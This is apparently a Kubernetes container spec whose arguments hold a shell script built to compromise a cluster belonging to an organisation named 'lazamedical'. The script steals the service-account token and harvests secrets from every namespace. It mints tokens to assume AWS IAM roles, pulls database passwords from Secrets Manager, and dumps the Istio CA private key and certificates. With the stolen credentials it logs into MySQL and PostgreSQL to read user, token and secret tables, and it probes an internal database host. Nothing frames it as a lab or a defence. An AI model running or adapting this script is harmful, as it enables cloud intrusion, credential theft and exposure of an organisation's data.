containers.name: probe
args:
#!/bin/sh
set -u
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token)
API=https://kubernetes.default.svc
get(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" "$1" 2>/dev/null; }
post(){ wget -q -O - --timeout=60 --no-check-certificate --header="Authorization: Bearer $TOKEN" --header="Content-Type: application/json" --post-data="$2" "$1" 2>/dev/null; }
echo "===I3560_START utc=$(date -u +%FT%TZ) host=$(hostname)==="
apk add --no-cache aws-cli jq mariadb-client postgresql16-client > /tmp/apk.log 2>&1
echo "apk_rc=$? aws=$(aws --version 2>&1|head -c 50) psql=$(command -v psql) mysql=$(command -v mysql)"
echo "EGRESS $(wget -q -O - --timeout=20 'http://ip-api.com/json/?fields=status,country,countryCode,regionName,city,isp,org,query')"
export AWS_DEFAULT_REGION=us-west-2
mkdir -p /tmp/sm

# ---------- PHASE 1: namespaces + SECRET_NAME / secret-name harvesting ----------
echo "###PHASE_NS"
NSJ=$(get "$API/api/v1/namespaces?limit=1000")
NSL=$(echo "$NSJ" | jq -r '.items[]?.metadata.name' 2>/dev/null)
echo "NS_LIST $(echo $NSL | tr '\n' ' ')"
: > /tmp/cm_ref.txt
: > /tmp/secname.txt
: > /tmp/allsec.txt
for NS in $NSL; do
  R=$(get "$API/api/v1/namespaces/$NS/configmaps?limit=500")
  echo "$R" | jq -r --arg ns "$NS" '.items[]? | "CMREF \($ns)/\(.metadata.name)\t" + ([ (.data // {}) | to_entries[]? | select(.key|test("(?i)secret|rds|db")) | (.key+"="+.value)] | join(" ; "))' 2>/dev/null >> /tmp/cm_ref.txt
  echo "$R" | jq -r '.items[]? | (.data // {}) | to_entries[]? | select(.key|test("(?i)secret")) | .value' 2>/dev/null >> /tmp/secname.txt
  S=$(get "$API/api/v1/namespaces/$NS/secrets?limit=500")
  echo "$S" | jq -r --arg ns "$NS" '.items[]? | "\($ns)/\(.metadata.name)|" + ((.data // {})|keys|join(","))' 2>/dev/null >> /tmp/allsec.txt
done
grep -Eo 'lazamedical-[A-Za-z0-9._-]+' /tmp/secname.txt | sort -u > /tmp/secname_u.txt
echo "SECNAME_N=$(wc -l < /tmp/secname_u.txt)"
cat /tmp/secname_u.txt
echo "###CM_REF"
grep -v 'CMREF .*\t$' /tmp/cm_ref.txt | head -80
echo "###SEC_INDEX_SECRETLIKE"
grep -Ei 'db|rds|secret|key|token|cred|auth|cert' /tmp/allsec.txt | head -80

# ---------- PHASE 2: IRSA SAs ----------
echo "###PHASE_SA"
ALLA=$(get "$API/api/v1/serviceaccounts")
N=$(echo "$ALLA" | jq -r '.items|length' 2>/dev/null)
if [ "${N:-0}" = "0" ] || [ "${N:-0}" = "null" ]; then
  echo "SA_CLUSTER_LIST_FAIL $(echo "$ALLA" | head -c 200)"
  : > /tmp/sas_all.txt
  for NS in $NSL; do
    get "$API/api/v1/namespaces/$NS/serviceaccounts?limit=500" | jq -r --arg ns "$NS" '.items[]? | "\($ns) \(.metadata.name) \(.metadata.annotations["eks.amazonaws.com/role-arn"] // "-")"' 2>/dev/null >> /tmp/sas_all.txt
  done
else
  echo "$ALLA" | jq -r '.items[]? | "\(.metadata.namespace) \(.metadata.name) \(.metadata.annotations["eks.amazonaws.com/role-arn"] // "-")"' > /tmp/sas_all.txt
fi
grep -v ' -$' /tmp/sas_all.txt | grep 'arn:aws:iam' > /tmp/sas.txt
echo "SA_TOTAL=$(wc -l < /tmp/sas_all.txt) SA_IRSA_TOTAL=$(wc -l < /tmp/sas.txt)"
cat /tmp/sas.txt

echo "###PHASE_ASSUME"
i=0
while read -r NS S ARN; do
  i=$((i+1))
  TK=$(post "$API/api/v1/namespaces/$NS/serviceaccounts/$S/token" '{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"audiences":["sts.amazonaws.com"],"expirationSeconds":3600}}')
  WT=$(echo "$TK" | jq -r '.status.token // empty' 2>/dev/null)
  if [ -z "$WT" ]; then echo "TOKEN_FAIL $NS/$S $(echo "$TK"|head -c 120)"; continue; fi
  RES=$(aws sts assume-role-with-web-identity --role-arn "$ARN" --role-session-name "i3560r$i" --web-identity-token "$WT" --duration-seconds 1800 --region us-west-2 --output json 2>&1)
  if echo "$RES" | jq -e '.Credentials' >/dev/null 2>&1; then
    echo "$RES" | jq -r .Credentials.AccessKeyId > /tmp/ak$i
    echo "$RES" | jq -r .Credentials.SecretAccessKey > /tmp/sk$i
    echo "$RES" | jq -r .Credentials.SessionToken > /tmp/st$i
    echo "$NS $S" > /tmp/who$i
    echo "ASSUME_OK $NS/$S role=$ARN"
  else
    echo "ASSUME_FAIL $NS/$S $(echo "$RES" | head -c 200 | tr '\n' ' ')"
  fi
done < /tmp/sas.txt

# ---------- PHASE 3: Secrets Manager GetSecretValue by exact name ----------
echo "###PHASE_SM"
KNOWN="lazamedical-dev01-usw2-mysql-1-db-secret
lazamedical-dp-dev01-usw2-postgresql-db-secret
lazamedical-dp-dev01-usw2-postgresql-db1-secret
lazamedical-dev01-usw2-postgresql-db-secret
lazamedical-dev01-usw2-postgresql-db1-secret
lazamedical-dev01-usw2-postgresql-rds2-db-secret
lazamedical-dp-dev01-usw2-mysql-1-db-secret
lazamedical-mlflow-dev01-usw2-db-secret
lazamedical-dev01-usw2-mysql-db-secret"
CAND=$( (printf '%s\n' "$KNOWN"; grep -i 'secret' /tmp/secname_u.txt) | grep -E '^lazamedical' | sort -u | head -20 )
echo "CAND_N=$(echo "$CAND" | wc -l)"; echo "$CAND"
PRI=""; REST=""
for nf in $(ls /tmp/who* 2>/dev/null); do
  n=${nf##*who}; W=$(cat "$nf")
  case "$W" in *data-management*|*user-management*|*mlflow*) PRI="$PRI $n";; *) REST="$REST $n";; esac
done
echo "ROLE_ORDER pri=[$PRI] rest=[$REST]"
CALLS=0
for n in $PRI $REST; do
  export AWS_ACCESS_KEY_ID=$(cat /tmp/ak$n); export AWS_SECRET_ACCESS_KEY=$(cat /tmp/sk$n); export AWS_SESSION_TOKEN=$(cat /tmp/st$n)
  W=$(cat /tmp/who$n)
  echo "ROLE_TRY $n $W"
  for SN in $CAND; do
    [ $CALLS -ge 90 ] && break
    [ -f "/tmp/sm/$SN.json" ] && continue
    CALLS=$((CALLS+1))
    R2=$(aws secretsmanager get-secret-value --secret-id "$SN" --region us-west-2 --output json 2>&1)
    if echo "$R2" | jq -e '.SecretString' >/dev/null 2>&1; then
      echo "$R2" | jq -r .SecretString > "/tmp/sm/$SN.json"
      echo "SMVAL_OK role=$W secret=$SN"
      echo "SMJSON $SN $(echo "$R2" | jq -r .SecretString)"
    else
      echo "SMERR secret=$SN role=$W $(echo "$R2" | grep -oE 'AccessDeniedException|ResourceNotFoundException|ValidationException|InvalidRequestException|InvalidParameterException' | head -1)"
    fi
  done
  unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
done
echo "SM_CALLS=$CALLS SM_HITS=$(ls /tmp/sm | wc -l)"

# ---------- PHASE 4: k8s Secret values (istio CA key + keda certs) ----------
echo "###PHASE_K8SSEC"
for X in istio-system/istio-ca-secret keda/kedaorg-certs; do
  NS=${X%%/*}; SN2=${X##*/}
  R3=$(get "$API/api/v1/namespaces/$NS/secrets/$SN2")
  echo "K8SSEC $X present=$(echo "$R3" | jq -r 'if .data then "yes" else "no" end' 2>/dev/null)"
  echo "$R3" | jq -r '.data // {} | to_entries[]? | "KEYNAME \(.key) b64len=\((.value|length))"' 2>/dev/null
  echo "$R3" | jq -r '.data // {} | to_entries[]? | "B64 \(.key) \(.value)"' 2>/dev/null
done

# ---------- PHASE 5: DB read-only ----------
echo "###PHASE_DB"
mysel(){ H=$1 U=$2 D=$3 Q=$4; mysql --connect-timeout=10 -h "$H" -P 3306 -u "$U" -D "$D" -N -e "$Q" 2>&1; }
J=/tmp/sm/lazamedical-dev01-usw2-mysql-1-db-secret.json
if [ -f "$J" ]; then
  MH=$(jq -r .host "$J"); MU=$(jq -r .username "$J"); MP=$(jq -r .password "$J"); MD=$(jq -r .dbname "$J")
  echo "MYSQL_META host=$MH user=$MU db=$MD"
  export MYSQL_PWD="$MP"
  echo "---MYSQL_VER"
  mysel "$MH" "$MU" "$MD" "SELECT VERSION(); SELECT CURRENT_USER();" | head -6
  mysel "$MH" "$MU" "$MD" "SELECT table_name FROM information_schema.tables WHERE table_schema='$MD' ORDER BY 1" > /tmp/mytabs.txt 2>&1
  echo "MYSQL_TABLES_N=$(wc -l < /tmp/mytabs.txt)"
  echo "MYSQL_TABLES $(tr '\n' ' ' < /tmp/mytabs.txt | head -c 4000)"
  for T in $(tr -d '\r' < /tmp/mytabs.txt | grep -Ei 'oauth|smtp|api_key|apikey|config|setting|credential|secret|token|client|provider|integration|mail' | head -20); do
    echo "---MYTAB $T"
    mysel "$MH" "$MU" "$MD" "SELECT * FROM \`$T\` LIMIT 50" 2>&1 | head -c 2500
    echo
  done
  unset MYSQL_PWD
else
  echo "MYSQL_NO_SECRET"
fi

pgq(){ PGHOST="$1" PGUSER="$2" PGDATABASE="$3" PGPASSWORD="$4" PGCONNECT_TIMEOUT=10 PGSSLMODE=require psql -At -c "$5" 2>&1; }
pghost_of(){ jq -r .host "$1"; }
for J in /tmp/sm/*postgresql*.json; do
  [ -f "$J" ] || continue
  PH=$(jq -r .host "$J"); PU=$(jq -r .username "$J"); PP=$(jq -r .password "$J"); PD=$(jq -r .dbname "$J")
  echo "===PG_SEC $(basename $J) host=$PH user=$PU db=$PD"
  echo "---PG_VER"
  pgq "$PH" "$PU" "$PD" "$PP" "select version(); select current_user;" | head -4
  pgq "$PH" "$PU" "$PD" "$PP" "select table_schema||'.'||table_name from information_schema.tables where table_type='BASE TABLE' and table_schema not in ('pg_catalog','information_schema') order by 1" > /tmp/pgtabs.txt
  echo "PG_TABLES_N=$(wc -l < /tmp/pgtabs.txt)"
  echo "PG_TABLES $(tr '\n' ' ' < /tmp/pgtabs.txt | head -c 5000)"
  if [ "$PD" = "mlflow_service" ]; then
    echo "---PG_COLS public.secrets"
    pgq "$PH" "$PU" "$PD" "$PP" "select column_name||':'||data_type from information_schema.columns where table_schema='public' and table_name='secrets' order by ordinal_position" | head -20
    echo "---PG_ROWS public.secrets"
    pgq "$PH" "$PU" "$PD" "$PP" "select row_to_json(t) from (select * from public.secrets limit 50) t" | head -c 4000
    echo
  fi
  if [ "$PD" = "mlflow_auth" ]; then
    echo "---PG_ROWS users"
    pgq "$PH" "$PU" "$PD" "$PP" "select row_to_json(t) from (select * from public.users limit 50) t" | head -c 3000
    echo
    echo "---PG_ROWS groups"
    pgq "$PH" "$PU" "$PD" "$PP" "select row_to_json(t) from (select * from public.groups limit 50) t" | head -c 1500
    echo
  fi
  if [ "$PD" = "dp_service" ]; then
    for TB in $(tr -d '\r' < /tmp/pgtabs.txt | grep -Ei 'config|setting|secret|credential|token|key|oauth|smtp|integration|provider|user' | head -20); do
      echo "---PGTAB $TB"
      pgq "$PH" "$PU" "$PD" "$PP" "select row_to_json(t) from (select * from $TB limit 50) t" | head -c 2000
      echo
    done
  fi
done

# rds2 TCP check (SG may block)
echo "###PHASE_RDS2"
python3 - <<'PY' 2>/dev/null || nc -z -w 8 10.1.1.226 5432 && echo RDS2_TCP_OPEN || echo RDS2_TCP_CLOSED
import socket
s=socket.socket(); s.settimeout(8)
try:
    s.connect(("10.1.1.226",5432)); print("RDS2_TCP_OPEN")
except Exception as e: print("RDS2_TCP_FAIL",e)
PY
echo "===I3560_DONE utc=$(date -u +%FT%TZ)==="
